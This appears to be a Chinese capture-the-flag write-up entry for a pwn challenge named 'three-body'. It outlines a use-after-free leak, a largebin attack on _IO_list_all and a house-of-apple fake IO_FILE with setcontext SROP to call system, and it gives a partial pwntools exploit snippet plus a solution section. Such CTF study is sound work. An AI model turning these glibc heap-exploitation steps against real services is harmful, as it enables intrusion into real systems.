# three-body

> 分类：Pwn

## 题目描述

UAF 题，一次 leak，一次 read。largebin attack + house of apple。

## 考察知识点

- UAF
- largebin attack
- house of apple（IO 利用）

## 解法

1. UAF 泄露 heap_addr 和 libc_base。
2. largebin attack 篡改 `_IO_list_all`。
3. house of apple 伪造 IO_FILE，配合 setcontext 做 SROP 执行 `system('cat flag')`。

关键点：随机数种子用 `time(0)`，需本地复现 `elf.srand(seed)` 保证操作可控。

```python
# largebin attack
target = libc_base + 0x21a680
fd_bk = libc_base + 0x21a110
fd_next = heap_addr + 0x2ed0

fake_largebin = p64(fd_bk)*2 + p64(fd_next) + p64(target-0x20)
# ...

# house of apple 伪造 IO_FILE
fake_IO_FILE = p64(0)*4
fake_IO_FILE += p64(1) + p64(0)
fake_IO_FILE += p64(fake_io_addr+0xb0)      # _IO_backup_base
fake_IO_FILE += p64(setcontext+61)          # _IO_save_end = call addr
# ...
sig = SigreturnFrame()
sig.rip = libc_base + libc.sym['system']
sig.rdi = heap_addr + 0x3400 + 0x10
sig.rsp = heap_addr + 0x100
```

（完整 exp 见原 writeup）

## 参考答案

（flag 通过 largebin attack + house of apple 执行 system 读取）

## 来源

- 作者：C4oy1Zz | https://cn-sec.com/archives/1802791.html
